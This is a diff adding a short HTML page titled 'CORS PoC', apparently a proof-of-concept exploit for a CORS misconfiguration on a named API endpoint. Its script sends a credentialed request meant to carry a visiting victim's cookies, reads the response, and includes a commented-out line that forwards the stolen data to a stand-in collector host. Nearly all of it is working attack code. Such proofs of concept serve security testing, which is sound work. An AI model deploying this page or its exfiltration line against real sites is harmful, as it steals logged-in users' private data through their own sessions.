@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC</title>
+</head>
+<body>
+    <h1>CORS Test Page</h1>
+    <pre id="output">Loading...</pre>
+
+    <script>
+        const target = 'https://cewrs-scrap-api.aii.et/api/SOME-ENDPOINT';
+        const output = document.getElementById('output');
+
+        fetch(target, {
+            credentials: 'include'  // sends victim's cookies
+        })
+        .then(r => r.text())
+        .then(data => {
+            output.textContent = data;
+            // Optional: exfiltrate to your own listener
+            // fetch('https://your-collector/collect?data=' + encodeURIComponent(data));
+        })
+        .catch(err => {
+            output.textContent = 'Error: ' + err.message;
+        });
+    </script>
+</body>
+</html>
